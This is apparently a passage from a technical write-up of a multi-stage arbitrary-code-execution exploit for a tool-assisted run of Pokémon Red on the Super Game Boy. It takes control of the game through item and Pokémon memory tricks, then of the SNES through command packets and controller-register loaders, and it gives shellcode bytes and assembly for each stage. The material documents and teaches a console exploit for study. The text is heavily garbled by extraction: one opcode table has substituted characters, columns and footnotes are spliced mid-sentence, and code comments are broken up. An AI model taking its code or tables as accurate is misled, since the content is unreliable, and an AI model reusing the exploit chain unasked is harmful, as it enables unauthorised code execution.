00 91 F0 00 00 91 F0 00 00 00 00 E1 50 00
toss 24 items
0xD32F 00 91 F0 00 00 91 F0 00 00 00 00 E1 38 00
toss 12 items
0xD32F 00 91 F0 00 00 91 F0 00 F4 00 00 E1 38 00
(same ID swap)
0xD32F 00 91 F0 00 63 91 F0 00 91 00 00 E1 38 00
toss 20 items
0xD32F 00 91 F0 00 4F 91 F0 00 91 00 00 E1 38 00
Pokemon
4  5 datastart = 0xD324
(even address, so now ID and ## are shifted)
Address ID ## ID ## ID ## ID ## ID ## ID ## ID ##
00 91 F0 00 4F 91 F0 00 91 00 00 E1 38 00
toss 45 items
0xD324 00 91 F0 00 4F 91 F0 00 91 00 00 E1 38 D3
toss 20 items
0xD324 00 91 F0 00 4F 91 F0 00 91 00 00 CD 38 D3
toss 222 items
0xD324 00 91 F0 00 4F 91 F0 00 91 22 00 CD 38 D3
toss 8 items
0xD324 00 91 F0 00 4F 91 F0 F8 91 22 00 CD 38 D3
toss 27 items
0xD324 00 91 F0 00 4F 76 F0 F8 91 22 00 CD 38 D3
toss 8 items
0xD324 00 91 F0 F8 4F 76 F0 F8 91 22 00 CD 38 D3
toss 27 items
0xD324 00 76 F0 F8 4F 76 F0 F8 91 22 00 CD 38 D3
Pokemon -8  -7 datastart = 0xD350
Pokemon
3  4 [0xD35B] = 00
Pokemon
4  5 [0xD366] = 00
Pokemon
5  2 datastart = 0xD366
Pokemon
2  -11 [0xD2CC] = 00
Pokemon -11  -9 [0xD32E] = 00
item
4  5 datastart = 0xD362
0xD362 00 76 F0 F8 4F 76 F0 F8 91 22 00 CD 38 D3
0xD324
Figure 4 – Pokémon and items are re-arranged in memory to create shellcode.
11xL
NOP
Lx
STOP L
(x
)x1 JR NZFr-
JR NCFr-
Rx
LD BFB
Sx
LD DFB
Hx
LD HFB
Zx
LD 9HLAFB
+x
ADD AFB
-x
SUB B
Ux
AND B
Ax
OR B
Bx
RET NZ
Cx
RET NC
Dx
Ex LDH 9a-AFA
Fx LDH AF9a-A
x(
LD BCFd(Z
LD DEFd(Z
LD HLFd(Z
LD SPFd(Z
LD BFC
LD DFC
LD HFC
LD 9HLAFC
ADD AFC
SUB C
AND C
OR C
POP BC
POP DE
POP HL
POP AF
x)
LD 9BCAFA
LD 9DEAFA
LD 9HLEAFA
LD 9HLNAFA
LD BFD
LD DFD
LD HFD
LD 9HLAFD
ADD AFD
SUB D
AND D
OR D
JP NZFa(Z
JP NCFa(Z
LD 9CAFA
LD AF9CA
xR
INC BC
INC DE
INC HL
INC SP
LD BFE
LD DFE
LD HFE
LD 9HLAFE
ADD AFE
SUB E
AND E
OR E
JP a(Z
xS
INC B
INC D
INC H
INC 9HLA
LD BFH
LD DFH
LD HFH
LD 9HLAFH
ADD AFH
SUB H
AND H
OR H
CALL NZFa(Z
CALL NCFa(Z
DI
xH
DEC B
DEC D
DEC H
DEC 9HLA
LD BFL
LD DFL
LD HFL
LD 9HLAFL
ADD AFL
SUB L
AND L
OR L
PUSH BC
PUSH DE
PUSH HL
PUSH AF
xZ
LD BFd-
LD DFd-
LD HFd-
LD 9HLAFd-
LD BF9HLA
LD DF9HLA
LD HF9HLA
HALT
ADD AF9HLA
SUB 9HLA
AND 9HLA
OR 9HLA
ADD AFd-
SUB d-
AND d-
OR d-
x+
RLCA
RLA
DAA
SCF
LD BFA
LD DFA
LD HFA
LD 9HLAFA
ADD AFA
SUB A
AND A
OR A
RST LLH
RST (LH
RST )LH
RST RLH
x-
LD 9a(ZAFSP
JR r-
JR ZFr-
JR CFr-
LD CFB
LD EFB
LD LFB
LD AFB
ADC AFB
SBC AFB
XOR B
CP B
RET Z
RET C
ADD SPFr-
LD HLFSPEr-
xU
ADD HLFBC
ADD HLFDE
ADD HLFHL
ADD HLFSP
LD CFC
LD EFC
LD LFC
LD AFC
ADC AFC
SBC AFC
XOR C
CP C
RET
RETI
JP 9HLA
LD SPFHL
xA
LD AF9BCA
LD AF9DEA
LD AF9HLEA
LD AF9HLNA
LD CFD
LD EFD
LD LFD
LD AFD
ADC AFD
SBC AFD
XOR D
CP D
JP ZFa(Z
JP CFa(Z
LD 9a(ZAFA
LD AF9a(ZA
xB
DEC BC
DEC DE
DEC HL
DEC SP
LD CFE
LD EFE
LD LFE
LD AFE
ADC AFE
SBC AFE
XOR E
CP E
PREFIX CB
EI
xC
INC C
INC E
INC L
INC A
LD CFH
LD EFH
LD LFH
LD AFH
ADC AFH
SBC AFH
XOR H
CP H
CALL ZFa(Z
CALL CFa(Z
xD
DEC C
DEC E
DEC L
DEC A
LD CFL
LD EFL
LD LFL
LD AFL
ADC AFL
SBC AFL
XOR L
CP L
CALL a(Z
xE
LD CFd-
LD EFd-
LD LFd-
LD AFd-
LD CF9HLA
LD EF9HLA
LD LF9HLA
LD AF9HLA
ADC AF9HLA
SBC AF9HLA
XOR 9HLA
CP 9HLA
ADC AFd-
SBC AFd-
XOR d-
CP d-
xF
RRCA
RRA
CPL
CCF
LD CFA
LD EFA
LD LFA
LD AFA
ADC AFA
SBC AFA
XOR A
CP A
RST L-H
RST (-H
RST )-H
RST R-H
Items1 with1 these1 IDs1 can1 be1 tossed
Game1 refuses1 to1 toss1 items1 with1 these1 IDs
Trying1 to1 toss1 items1 with1 these1 IDs1 crashes1 the1 game
Items1 with1 these1 IDs1 are1 initially1 tossableF1 but1 tossing1 any1 makes1 game1 to1 refuse1 to1 toss1 more
Just1 trying1 to1 show1 these1 IDs1 freezes1 the1 game
Figure 5 – Item IDs can double as Z80 opcodes.
code—as it would be quite tedious to use this method
to do anything longer. 13 Here’s a disassembly of
what we’ve been able to write so far, starting from
0xD361.
0xD362
00 76 F0 F8 4F 76 F0 F8 91 22 00 CD 38 D3
LR35902 shellcode at 0xD361:
30 00
JR NC,0
76
HALT
Player's
LDH A, (0xF8)
starting money F0 F8
4F
LD C,A
76
HALT
F0 F8
LDH A, (0xF8)
91
SUB C
22
LD (HL+),A
00
NOP
CD 38 D3 CALL 0xD338
//
//
//
//
//
//
//
//
nop
wait for frame
load input
save in C
wait for frame
load input
decode opcode
stage2[HL++] = A
ing the menu, the map level script pointer is loaded
and called, so it loads the value in 0xD36E into HL
and jumps to it.
1041
2 1044
1045
4 1046
1047
6 104A
104B
LD HL, 0xD36E
LD A, ( HL+)
LD H, ( HL)
LD L ,A
LD DE, 0x104C
PUSH DE
JP (HL) ; [ D36E ]
Stage 1’s purpose is to read the buttons being
held down on the controller and write them some-
where, eventually executing what we’ve written us-
ing this slightly more efficient method than twid-
dling with Pokémon and items. At a high level,
this code will read a byte from the controller on one
frame, read another byte from the controller on the
next frame, subtract the two, store the result at a
given memory offset and repeat, successively storing
values one byte at a time in order in memory, and
ultimately executing said bytes.
The game’s NMI (Non-Maskable Interrupt) rou-
tine writes a bitmap of the current buttons be-
ing held down during each frame (mapped as the
buttons ABsSRLUD from lowest to highest bit)
to 0xFFF8, and HALT is used to wait for the next
frame. Unfortunately, the SGB BIOS cancels out
LEFT+RIGHT or UP+DOWN if they are pressed
simultaneously and instead converts those bits to
0’s. To work around it, our short routine reads
two frames and combines the values in a way that
can yield arbitrary bytes. Because of restrictions on
// call stage2
Everything up to this point has been the process
of writing Stage 1, but now it’s time to walk through
executing it, although some of the shortcuts we took
require a bit of explanation.
First, the reason 0xD361 contains 30 is because
the beginning of the Stage 1 data is mostly copied
from the field that holds the rival name—which hap-
pens to be directly preceded by the player’s money.
Of this quantity we see the last two out of three
bytes represented here in BCD format; the full value
00 30 00 starts at 0xD360. It would take extra ef-
fort to eliminate the 30 00 portion, but because that
sequence is effectively a NOP, we leave it be.
To reduce the number of bytes that needed to
be modified, we used several clever tricks. The code
that jumps to this point sets HL to the jump target
address, and HL is a canonical pointer register that
can be written to. We reused 0xD36E (the map level
script pointer) as the loop jump address; upon exit-
item and 190modFF = 91 is stored as the remainder in the other.
14 There is no working way to ADD the two reads because we can’t write that opcode. Due to byte restrictions, we can’t use
JP either, but CALL is close enough. See Figure 5.
12D338
which bytes we can create, we use LD C,A to store
the first value and then SUB C to combine them. 14
Using this method, we write the following data
to 0xD338, which is executed every frame; that is to
say, it is repeatedly executed even before it is fully
written!
D33A
JR 39
D338
D338
NOPs (00s)
D363
acts as a NOP
D36D
D33A
D338
D33A
D370
exploited
address
D361
NOPs (00s)
JR 00
D363
JR NC,0
D36D
S1 payload
D370
Call D338
write position
We write 0x27 into current write position, turn-
ing the first instruction into a nontrivial jump.
D338
D33A
JR 39
D361
NOPs (00s)
D363
JR NC,0
D36D
S1 payload
D36D
S1 payload
JR 0
D370
Call D338
D361
S2 payload (executed)
D363
D7
JR -41
D36D
S1 payload
D370
Call D338
write position
We write 0x18 (JR x) into current write position
and advance write position:
D338
D363
18
One last note before moving on to what Stage 2
will do for us: as with most things in this exploit, en-
tering the Stage 2 payload isn’t as straightforward as
it should be, and this time it’s because the SNES and
the DMG run at different clock speeds and framer-
ates. It takes 351,120 cycles for the DMG to run one
frame, and 357,366 for the SNES to run one frame.
Each side polls the inputs once per their frame, and
the SNES side updates the inputs that the DMG
side reads once per frame. Since each SNES frame
takes slightly longer, the SNES regularly skips up-
dating inputs for one full DMG frame, causing the
input to be duplicated. 15
This clock skew slip happens about every 56
DMG frames. (Sometimes it’s 57 frames between
slips due to slipping.) It takes a full 86 frames
to input the Stage 2 sequence because there are
39 bytes of payload plus 4 bytes total for prologue
and epilogue jump instructions, and each byte takes
2 frames to enter as a result of working around
L+R and U+D combinations being nulled out. This
means we have to cope with at least one clock skew
slip and because 86 isn’t that much bigger than 2*56
writes one byte
at each execution
write position
(by S1, from the data
sent via the controller)
D361
S2 payload (skipped)
D33A
JR 39
Call D338
S1 payload
D370
Call D338
We write D7 into 0xD362, which modifies the in-
struction to be JR -41, which jumps to 0xD33A, the
start of the second payload. After one more call into
0xD338 and the subsequent jump to 0xD360, the ex-
ecution jumps to the Second Stage.
We write D7 (-41) to current position, turning
the jump into a jump to execute the Stage 2:
written by inventory abuse
JR NC,0
D36D
S1 payload
write position
The memory range from 0xD338 to D360 con-
tains only 00’s and forms a cascade of harmless NOP
instructions. This is critical, because this entire sec-
tion is executed every time a byte is written; this
also means we have to be extremely careful with
what we write, to avoid executing an incomplete
Stage 2 that causes a crash. The solution is to write
a jump instruction of 18 27 into the first two bytes—
which will skip execution of Stage 2 while it is being
constructed. The sequence 18 27 can’t be entered
in one frame, but fortunately the incomplete form,
18 00, is effectively a NOP instruction. This gives
us the full range from 0xD33A to 0xD360 where we
can write whatever we want with impunity, and HL
points to 0xD33A.
D361
00
JR NC,0
write position
JR 39
player's
money
D363
30
After this, we somehow need to jump to the
newly completed Stage 2. The HL now points to
0xD360 and the next byte we poke is 18, which turns
the first instruction in the Stage 1 code into JR 0,
which is still effectively a NOP.
We write 18 (JR x) to current position, turning
the 30 into 18, acting as a JR 0 instruction.
1 18 27 <= f i r s t jump
3E 1C CD AF 00 21 4D D3 CD EB 5F 2E 58 00 CD
EB 5F 18 FE 79 00 18 00 06 AD 12 42 30
FB 40 91 18 42 00 00 18 00 00 00 <=
Stage 2 payload
3 18 D7 <= s e c o n d jump
exploit call
D361
S2 payload (skipped)
D370
Call D338
write position
We write the Second Stage to D33A–D360 which
is jumped over and not executed. This takes 39 it-
erations through the loop.
15 This has implications even outside of TAS’ing: If you hold a button for a single frame you risk that input being lost (if
the previous frame had no buttons being pressed, that single frame’s press could be overwritten with the no buttons pressed
frame from before) or your buttons could be held for an extra frame (even though you let go, you hit right before the skew so
your buttons are sent for an additional frame). Both of these behaviors could cause a talented realtime player to question their
abilities as they wouldn’t have any idea that the console had been the cause of their input being wrong.
13Figure 6 – Sending payload (combos injected by first controller)
0x
1x
2x
3x
4x
5x
6x
7x
8x
9x
Ax
Bx
Cx
Dx
Ex
Fx
x0
NOP
STOP 0
JR NZ,r8
JR NC,r8
LD B,B
LD D,B
LD H,B
LD (HL),B
ADD A,B
SUB B
AND B
OR B
RET NZ
RET NC
LDH (a8),A
LDH A,(a8)
x1
LD BC,d16
LD DE,d16
LD HL,d16
LD SP,d16
LD B,C
LD D,C
LD H,C
LD (HL),C
ADD A,C
SUB C
AND C
OR C
POP BC
POP DE
POP HL
POP AF
x2
LD (BC),A
LD (DE),A
LD (HL+),A
LD (HL-),A
LD B,D
LD D,D
LD H,D
LD (HL),D
ADD A,D
SUB D
AND D
OR D
JP NZ,a16
JP NC,a16
LD (C),A
LD A,(C)
x3
INC BC
INC DE
INC HL
INC SP
LD B,E
LD D,E
LD H,E
LD (HL),E
ADD A,E
SUB E
AND E
OR E
JP a16
DI
x4
INC B
INC D
INC H
INC (HL)
LD B,H
LD D,H
LD H,H
LD (HL),H
ADD A,H
SUB H
AND H
OR H
CALL NZ,a16
CALL NC,a16
x5
DEC B
DEC D
DEC H
DEC (HL)
LD B,L
LD D,L
LD H,L
LD (HL),L
ADD A,L
SUB L
AND L
OR L
PUSH BC
PUSH DE
PUSH HL
PUSH AF
x6
LD B,d8
LD D,d8
LD H,d8
LD (HL),d8
LD B,(HL)
LD D,(HL)
LD H,(HL)
HALT
ADD A,(HL)
SUB (HL)
AND (HL)
OR (HL)
ADD A,d8
SUB d8
AND d8
OR d8
x7
RLCA
RLA
DAA
SCF
LD B,A
LD D,A
LD H,A
LD (HL),A
ADD A,A
SUB A
AND A
OR A
RST 00H
RST 10H
RST 20H
RST 30H
x8
LD (a16),SP
JR r8
JR Z,r8
JR C,r8
LD C,B
LD E,B
LD L,B
LD A,B
ADC A,B
SBC A,B
XOR B
CP B
RET Z
RET C
ADD SP,r8
LD HL,SP+r8
x9
ADD HL,BC
ADD HL,DE
ADD HL,HL
ADD HL,SP
LD C,C
LD E,C
LD L,C
LD A,C
ADC A,C
SBC A,C
XOR C
CP C
RET
RETI
JP (HL)
LD SP,HL
xA
xB
xC
xD
xE
xF
LD A,(BC)
DEC BC
INC C
DEC C
LD C,d8
RRCA
LD A,(DE)
DEC DE
INC E
DEC E
LD E,d8
RRA
LD A,(HL+)
DEC HL
INC L
DEC L
LD L,d8
CPL
LD A,(HL-)
DEC SP
INC A
DEC A
LD A,d8
CCF
LD C,D
LD C,E
LD C,H
LD C,L
LD C,(HL)
LD C,A
LD E,D
LD E,E
LD E,H
LD E,L
LD E,(HL)
LD E,A
LD L,D
LD L,E
LD L,H
LD L,L
LD L,(HL)
LD L,A
LD A,D
LD A,E
LD A,H
LD A,L
LD A,(HL)
LD A,A
ADC A,D
ADC A,E
ADC A,H
ADC A,L
ADC A,(HL) ADC A,A
SBC A,D
SBC A,E
SBC A,H
SBC A,L
SBC A,(HL) SBC A,A
XOR D
XOR E
XOR H
XOR L
XOR (HL)
XOR A
CP D
CP E
CP H
CP L
CP (HL)
CP A
JP Z,a16
PREFIX CB CALL Z,a16 CALL a16
ADC A,d8
RST 08H
JP C,a16
CALL C,a16
SBC A,d8
RST 18H
LD (a16),A
XOR d8
RST 28H
LD A,(a16)
EI
CP d8
RST 38H
from http://www.pastraiser.com/cpu/gameboy/gameboy_opcodes.html
Figure 7 – Z80 opcodes that can be sent through SGB input filtering.
the slip position must be relatively near the middle
to avoid having to deal with two slips. 16
3.8
we need to switch to. While the ROM bank can be
switched by a single write, the game NMI routine
(which runs every frame) does not save the bank -
it switches to one stored in another memory address
instead. Two writes are needed to reliably change
the bank which would take too much space; however,
the common part of ROM (mapped regardless of
the bank) has a function that does something, then
switches banks and returns. That function makes
for a very useful gadget! The entry address for this
function is 0x00AF, with register A holding the bank
number.
Stage 2: Sending packets to es-
cape SGB from very little space.
We have just 39 bytes to work with in the Stage 2
payload we just wrote and we need to make the most
out of every last byte. Fortunately, Pokémon Red
already contains a routine that sends a command
packet into the SNES. The catch is the code to send
that packet is in another ROM bank (0x1C) that
16 The
movie
we
used
was
2(prologue)+5(banksetting)+6(packetsend)+5(packetsend)+1(nop-for-
slip)+2(hang)+11(packet1)+7(packet2)+2(unused)+2(epilogue)=43
bytes.
We
later
discovered
a
different
method
where
the
smallest
possible
extended
payload
would
have
been
2(pro-
logue)+5(banksetting)+6(packetsend)+2(hang)+13(packet)+2(epilogue)=30 bytes which is still too much to input without a
slip due to our data rate being restricted to one nibble at a time, although the packet data’s 0x00 portion could potentially be
used for this purpose.
17 It could be possible to use just one, by putting the NMI routine in a memory-mapped SGB packet register, but we decided
not to, as we would need full exploit abilities just to test if this method actually works because the emulator isn’t accurate
enough to test with.
14to occur in a bad way. The 00 freed from only
loading L is close enough to the middle that this
byte can be targeted for duplication. It turned out
that the emulator doesn’t emulate the input slipping
quite accurately and we (dwangoAC) had to do a lot
of tedious trial and error testing to time the input
correctly. 18 The offset between emulator and real
hardware turned out to be eight frames, which we
adjusted by adding eight frames of no input into the
file sent to the bot prior to exiting the menu.
We need to send two separate command pack-
ets, described below. 17 The packets aren’t a full 16
bytes in length like they appear to be, but 11 and 7
bytes; the tails of the packets are ignored, so we let
the packet payloads overrun into whatever happens
to be next. After sending the packets, we have no
use for the DMG anymore, so we hang the Z80 by
entering a tight loop.
The following Stage 2 assembly code is loaded
into 0xD33A—D360.
1 ; The g a d g e t t a k e s a new bank number i n A.
3E 1C
LD A, #$1C
3 ; Call the bankswitch gadget .
CD AF 00 CALL $ 0 0 a f
5 ; The a d d r e s s o f t h e f i r s t p a c k e t t o send .
21 4D D3 LD HL, p a c k e t 1
7 ; C a l l p a c k e t send r o u t i n e .
CD EB 5F CALL $ 5 f e b
9
; The low b y t e o f a d d r e s s o f t h e 2nd p a c k e t .
11 ; used t o compensate i n p u t s l i p p i n g .
2E 58
LD L , 0 x58
13 00
NOP
; C a l l p a c k e t send r o u t i n e .
15 CD EB 5F CALL $ 5 f e b
17 18 FE
JR −2
3.9
Exploiting DMG→SGB com-
mand packets for gaining a
foothold on SNES
The Super Game Boy command packet protocol has
two nifty commands for gaining control of the SNES.
0x79 writes arbitrary data to an arbitrary memory
location, while 0x91 sets the NMI vector and jumps
to an arbitrary address. Both commands are real,
documented command packets; they are not undoc-
umented debug commands.
Since the Stage 2 executing on the DMG is so
small we needed to minimize the number of pack-
ets required. The SNES’s controller registers are
memory-mapped I/O registers that automatically
update each video frame when enabled. It is possible
to execute code from those registers but it isn’t par-
ticularly easy to do so, largely because it is very un-
safe to execute anything from those registers when
they are in the middle of an update. (There are all
sorts of intermediate stages.)
The solution is to find some way for the SNES
CPU to waste time during that update elsewhere.
The NMI vector and the NMI handler are perfect
for this: when enabled, it starts running just before
the register starts updating, so we just need an NMI
handler that wastes somewhere between roughly 4
and 260 scanlines so it hits after the current NMI
returns but before the next NMI starts. Scanning
descriptions of various SNES I/O registers, a useful
one seems to be $4212, which has bit 7 set when
the console is performing a vertical retrace. The
NMI occurs immediately after the vertical retrace
starts and the retrace lasts for about 40 scanlines,
so waiting for $4212 bit 7 to clear works out per-
fectly. Since the retrace bit is bit 7 and the SNES
CPU happens to be in a mode where the A regis-
; Hang t h e DMG.
19 p a c k e t 1 : ; 0 xd34d
DB 0 x79 , 0 x00 , 0 x18 , 0 x00 , 0 x06 , 0xad ,
21
0 x12 , 0 x42 , 0 x30 , 0 xfb , 0 x40
23 p a c k e t 2 : ; 0 xd358
DB 0 x91 , 0 x18 , 0 x42 , 0 x00 , 0 x00 , 0 x18 ,
25
0 x00 , 0 x00 , 0 x00
Originally, the LD L, 0x58 ; NOP sequence was
LD HL, 0xD358 but we discovered that the transfer
routine leaves the upper eight bits of the address in
the H register at the end of the transfer. The trans-
fer end of the packet at 0xD34D will be 0xD35D, so
the H register will be D3, which is exactly the value
we want for the next packet, so we can save one byte
by just loading the L register. The saved byte can
taken to be NOP (00).
The repeated input can land on two inputs of
the same byte, or the last input of one byte and
first input of next. The latter is much better, since
for any byte pair, it is possible to construct three
valid inputs. However, the first is much worse: The
byte will be forced to 00, and even more unfortu-
nately, the frame rules always cause the duplication
18 Each blind test took about 5 minutes, as we had to play back the entire movie before reaching the point where we could
determine if it worked and we weren’t entirely certain it would work at all, but eventually we discovered the correct offset.
19 Based on the setting of a flags register bit that selects between an 8– and 16–bit A register.
15ter is 8 bits wide, 19 numbers with bit 7 set show as
negative, so it’s trivial to branch on those using BMI
instruction. Handily enough, the LDA instruction
that loads the memory address into the A register
sets the condition flags, so we can just loop around
that one instruction using BMI.
After the loop, we must return from the NMI.
This is done using the RTI instruction, so the final
NMI handler looks like:
The second one jumps to 0x004218 (which is the
start of the controller registers), with the NMI vec-
tor set to 0x001800 (which points to the routine we
just wrote). 20
91
2 18 42 00
00 18 00
1 loop :
AD 12 42 LDA $4212 ; Read 0 x4212 .
3 30 FB
BMI l o o p
; Loop while b i t 7 i s s e t .
40
RTI
; Return from NMI .
3.10
;
;
;
;
Stage 3: From stable loop in au-
topoller registers to loading pay-
loads.
(480 bytes per second; 60 payload bytes per second.)
We have transferred control flow to controller
registers, but we aren’t done just yet. The controller
registers are only eight bytes in size, and normally
not all bits are even controllable. However, there are
some tricks we can play to control all the bits. First,
even though a standard SNES controller only has 12
buttons, the autopoller reads all 16 bits. Normally
the last four bits are controller type identification
bits. Since those bits are read from the controller,
the controller can set those bits to whatever it likes,
including changing those bits every frame. Second,
the last four bytes of the register are read from the
second data line that is normally not connected to
anything unless there is a multitap device. It isn’t
possible to just connect a multitap device whenever
we like as the game will softlock. Fortunately, it is
possible to just connect the second controller so that
it shares all the other pins (+5V, ground, latch and
clock), but use the second data pin instead the first.
These two tricks allow controlling all 128 bits in
the controller registers which gives us 8 bytes of data
per frame. While this is a huge improvement over
our Stage 1 effective data rate of a nibble per frame
it still only amounts to a datarate of 300 bytes per
frame because three of those 8 bytes need to be used
for looping in the controller registers, leaving only
five bytes usable. (Although, as you’ll see, only one
byte of payload data can be sent per frame.)
Specifically, to loop successfully in the controller
registers we need to wait for the NMI induced in-
terrupt in order to avoid the NMI happening at an
unpredictable instruction (because the NMI trashes
A) and then jump to the start of the controller reg-
ister. Then there is issue that NMI is not initially
This handler trashes the A register, which is gen-
erally considered bad style, but we can get away
with doing that.
We send two packets; the first one writes six
bytes (AD 12 42 30 FB 40) into the memory ad-
dress 0x001800. This is the NMI routine.
79
2 00 18 00
06
4 AD 12 42 30 FB 40
; Jump
; Jump Ta rge t
; NMI V e c t o r
Write Memory
Ta rge t Address
Size
Content
Figure 8 – Inception
20 We considered putting the NMI code into the SGB packet receive buffer, which is a memory-mapped I/O register (and
presumably can be executed by the CPU). We decided against this since the SGB emulation in BSNES is quite questionable
and we didn’t know if it would work, largely due to the difficulty of testing it.
16enabled, even if the handler is set, so the first frame
has to enable the NMI handler. Fortunately, this
can be done rather compactly:
to jump to the desired address. Since the DMG is
still playing some annoying tunes, the first order of
business is to try to crash it. Writing 00 to the clock
control/reset register at 0x6003 should do the trick
by stopping the DMG clock, and in fact this works
in the LSNES emulator, but on a real console the an-
noying tunes keep playing until the DMG corrupts
itself enough to crash completely. 21
1 loop :
A9 81
LDA #$81
3 8D 00 42 STA $4200
; S e t 0 x4200 = 0 x81 (
a u t o p o l l e r e n a b l e d , IRQ d i s a b l e d , NMI
enabled )
CB
WAI
5 80 F8
BRA l o o p
3.11
Since the code is idempotent, this is good time to
switch from sending input in once per frame to send-
ing input in once per latch poll. The way the SGB
BIOS polls the controllers is completely crazy, often
polling more than once per frame, polling too many
bits, trying to poll but leaving the latch held high,
etc. Because this is a somewhat common problem
even in other games, the bot connected to the con-
troller ports has a mode where it synchronizes what
input to send based on the edge of each video frame
(i.e. 60ths of a second in a polling window) by keep-
ing track of how much time has elapsed; if the game
asks for input more than once on the same frame
we give it that frame’s input again until we know
it is time for the next frame’s polls, which means
we can follow the polling no matter how crazy it is.
The obvious tradeoff is that this mode is limited to
8 bytes per frame with 4 controllers attached, so we
need to switch the bot’s mode to one that is strictly
polling based, sending the next set of button presses
on each latch. Making that transition can be a bit
glitchy considering it was added as a firmware hack
but because this piece of code is idempotent we can
just spam the same input several times as we only
need it to hit in the range. This happens from frame
12117 to 12212 in the movie.
We now have a stable loop in the controller reg-
isters that we can use to poke some code into RAM.
The five bytes per frame is enough to write one byte
per frame into an arbitrary address in first 8kB of
the SNES’s RAM:
1 LDA #$xx
STA $yyyy
Stage 4: Increasing the datarate
even further.
(3840 bytes per second.)
One byte per frame is rather slow as it would take
us several minutes to write our payload at that speed
so we poke the following routine (Stage 4) that reads
8 bytes per frame from the autopoller registers and
writes it sequentially to RAM, starting from 0x1A00
until 0x1B1F into address 0x19000.
SEP #$30
2 LDA #$01
; S e t 8− b i t A and X/Y
; S e t 0 x4200 = 0 x01
; ( a u t o p o l l e r en , NMI d i s )
4 STA $4200
REP #$10
; S e t 16− b i t X/Y, keep A 8− b i t .
6 LDY #$1A00 ; Load a d d r e s s t o w r i t e t o .
wait_vblank_start :
8 LDA $4212
; Wait u n t i l vb la nk s t a r t s .
BPL w a i t _ v b l a n k _ s t a r t
10 wait_vblank_end :
LDA $4212
; Wait u n t i l v bl an k ends , s o t h e
12
; new c o n t r o l l e r v a l u e a r r i v e s .
BMI wait_vblank_end
14 LDX #$4218
; Start address of c o n t r o l l e r reg
.
LDA #$00
; MVN c o p i e s 16− b i t amount o f
b y t e s , even with A b e i n g 8 b i t .
16 XBA
; So e n s u r e t h a t t h e h i g h b i t s a r e
zero .
LDA #$07
; A = 7 , copy 8 b y t e s .
18 PHB
; MVN c h a n g e s t h e data bank
register , so save i t .
MVN $7E , $00
; Copy t h e 8 b y t e s from 0
x4218 t o RAM. Y i s auto−i n c r e m e n t e d .
20 PLB
; R e s t o r e t h e data bank r e g i s t e r .
CPY #$1B20
; Have we r e a c h e d 0 x1820 ?
22 BNE w a i t _ v b l a n k _ s t a r t
; I f no , w a i t a frame
and r e a d a g a i n .
JML $7E1A08
; Jump t o r e a d p a y l o a d .
This assembles to five bytes, A9 xx 8D yy yy.
Finally, after the writes, we can use JML (four bytes)
As machine code, e2 30 a9 01 8d 00 42 c2
10 a0 00 1a ad 12 42 10 fb ad 12 42 30 fb
21 It’s not a surprise that it behaves differently in the emulator, as the SGB emulation accuracy in BSNES is questionable
in a lot of places; it’s possible that the emulator is triggered on a different edge of the clock than real hardware or something
similar. Regardless, on real hardware the DMG eventually crashes in a way that makes it stop producing sound and while it’s
about the equivalent of driving a car into a brick wall instead of hitting the brakes it at least gets the job done.
17a2 18 42 a9 00 eb a9 07 8b 54 7e 00 ab c0
20 1b d0 e4 5c 08 1a 7e.
Why jump to eight bytes after the start of the
payload? It turns out that code loads some junk
from what is previously in the controller registers
on the first frame, so we just ignore the first few
bytes and start the payload code afterwards. Eight
bytes per frame still isn’t fast enough, so the rou-
tine this code pokes into RAM is another loader rou-
tine that uses serial controller registers to read eight
bytes eight times per frame, for total of 64 bytes per
frame.
Let’s take a look at the Stage 5 payload:
1 ; 0000 => C u r r e n t t r a n s f e r a d d r e s s .
; 0002 => T r a n s f e r end a d d r e s s .
3 ; 0004 => B l o c k s t o t r a n s f e r .
; 0006 => C u r r e n t t r a n s f e r bank .
5 ; 0008 => 0 : T r a n s f e r not i n p r o g r e s s .
;
1: Transfer in progress .
7 ; 000C => B l o c k s t r a n s f e r r e d .
; 0010 => Jump v e c t o r t o n e x t i n c h a i n .
9 ; 0020 −0027 => B u f f e r
; 0080−00BF => B u f f e r .
11
Start :
13 NOP
; 8 NOPs , f o r t h e junk a t s t a r t .
NOP
15 NOP
NOP
17 NOP
NOP
19 NOP
NOP
21 SEI
LDA #$00
; A u t o p o l l o f f , NMI and IRQ o f f .
23 STA $4200
25 REP #$30
; 16− b i t A/X/Y.
27 LDA #$0000
; I n i t i a l l y no t r a n s f e r .
STA $0008
29
frame_loop :
31
SEP #$20
33 not_in_vblank : ; Wait u n t i l n e x t vb la nk ends
LDA $4212
35 BPL not_in_vblank
in_vblank :
37 LDA $4212
BMI in_vblank
39 REP #$20
41 LDA #$0008
STA $0004
43 LDA #$0000
STA $000C
45
rx_block :
47 LDA #$0001
STA $4016
49 LDX #$0003
l at ch _ hi gh _ wa it :
51 DEX
BNE la tc h_ h ig h_ w ai t
53 STZ $4016
LDX #$0004
55 latch_low_wait :
DEX
57 BNE latch_low_wait
59 LDA
STA
61 STA
STA
#$0000
$0020
$0022
$0024
Figure 9 – Now using four controllers!
1863 STA $0026
65 LDY #$0010
read_loop :
67 LDA $4016
PHA
69 ; B i t 0 => 0 0 2 0 , B i t 1 => 0 0 2 4 ,
; B i t 8 => 0 0 2 2 , B i t 9 => 0026
71 BIT #$0001
BNE b0nz
73 LDA $0020
ASL A
75 BRA b0d
b0nz :
77 LDA $0020
ASL A
79 EOR #$0001
b0d :
81 STA $0020
83 PLA
PHA
85 BIT #$0002
BNE b1nz
87 LDA $0024
ASL A
89 BRA b1d
b1nz :
91 LDA $0024
ASL A
93 EOR #$0001
b1d :
95 STA $0024
97 PLA
PHA
99 BIT #$0100
BNE b8nz
101 LDA $0022
ASL A
103 BRA b8d
b8nz :
105 LDA $0022
ASL A
107 EOR #$0001
b8d :
109 STA $0022
111 PLA
BIT #$0200
113 BNE b9nz
LDA $0026
115 ASL A
BRA b9d
117 b9nz :
LDA $0026
119 ASL A
EOR #$0001
121 b9d :
STA $0026
123
DEY
125 BNE read_loop
127 ; Move t h e b l o c k from 0020 t o i t s
LDA
129 ASL
ASL
131 ASL
CLC
133 ADC
TAY
135 LDX
LDA
137 MVN
$000C
A
A
A
#$0080
#$0020
#$0007
$00 , $00
139 ; I n c r e m e n t t h e c o u n t e r a t 000C,
; decrement t h e count a t 0 0 0 4 .
141 ; I f no more b l o c k s , e x i t .
LDA $000C
143 INA
STA $000C
145 LDA $0004
DEA
147 STA $0004
BEQ e x i t _ r x _ l o o p
149 JMP rx_block
exit_rx_loop :
151
LDA $0008
153 BNE d o i n g _ t r a n s f e r
; Okay , s e t u p t r a n s f e r .
155 LDA $0082
CMP #$FF
157 BMI not_jump
